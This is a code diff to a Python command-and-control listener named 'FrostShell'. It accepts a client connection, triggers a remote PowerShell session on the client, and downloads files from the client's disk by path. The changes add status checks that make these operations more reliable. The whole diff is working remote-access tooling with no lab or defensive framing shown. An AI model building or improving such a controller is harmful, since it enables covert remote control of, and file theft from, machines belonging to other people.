@@ -9,7 +9,7 @@ import datetime
 #if there are some bytes sent, read them and return immediately, regardless of the parameter passed to the function
 
 
-acceptedCMD = {"exit": 1, "powershell": 2, "get": 3}
+acceptedCMD = {"close": 1, "powershell": 2, "get": 3}
 
 def performHandshake(c):
     handshake = c.recv(10)
@@ -42,7 +42,7 @@ def getCommand():
         command = input("FrostShell> ").split(" ")
         if (command[0] in acceptedCMD.keys()):
             return command
-        elif (command[0] == "close"):
+        elif (command[0] == "exit"):
             exit(0)
         print("Invalid command")
     
@@ -69,8 +69,13 @@ def getFileFromClient(c, command):
         return
     clientCmd = struct.pack("<i", acceptedCMD[command[0]]) + command[1].encode("utf-8")
     connection.send(clientCmd)
-    
     filename = datetime.datetime.now().strftime("%H-%M-%d-%m-%Y") + command[1].split("\\")[-1] 
+    
+    clientStatus = recvCommandStatus(c)
+    if (clientStatus != 0):
+        print("Failed to get file. Error :" + str(clientStatus))
+        return
+    
     c.setblocking(False)
     with open(filename, "wb+") as f:
         while True:
@@ -82,16 +87,26 @@ def getFileFromClient(c, command):
                 break
     c.setblocking(True)
     return
-    
-
-
-        
+  
+#receive the status to know if the command suceeded of failed  
+def recvCommandStatus(c):
+    status = b""
+    c.setblocking(False)
+    ready = select.select([c], [], [], 5)
+    if (ready[0]):
+        result = c.recv(4)
+        status += result
+    else:
+        status = b"\xff\xff\xff\xff"    #0xffffffff indicates that we didn't even receive the status from client
+    c.setblocking(True)
+    return struct.unpack("<i", status)[0]
     
 addr = ("localhost", 8888)
 s = socket.socket()
 s.bind(addr)
 s.listen(1)
 
+#main loop of the shell
 while True:
     print("Waiting for connection...")
     (connection, clientAddr) = s.accept()
@@ -101,23 +116,26 @@ while True:
         if (performHandshake(connection)):
             while True:
                 command = getCommand()               
-
                 #handle each command
-                if (command[0] == "exit"):
-                    print("Turn off shell")
+                if (command[0] == "close"):     #close the connection to the current client 
+                    print("Turn off shell") 
                     connection.send(struct.pack("<i", acceptedCMD[command[0]])) #send command code to the client
                     break
                 
                 elif (command[0] == "powershell"):
                     print("Open Powershell")
                     connection.send(struct.pack("<i", acceptedCMD[command[0]])) #send command code to the client
-                    output = receiveData(connection, 5)
-                    if (output):
-                        sys.stdout.write(output)
+                    status = recvCommandStatus(connection)
+                    if (status == 0):   
+                        output = receiveData(connection, 5)
+                        if (output):
+                            sys.stdout.write(output)
+                        else:
+                            print("Client error")
+                            break
+                        communicatePowershell(connection)
                     else:
-                        print("Client error")
-                        break
-                    communicatePowershell(connection)
+                        print("Can't spawn powershell. Error: " + str(status))
                     
                 elif (command[0] == "get"):
                     getFileFromClient(connection, command)
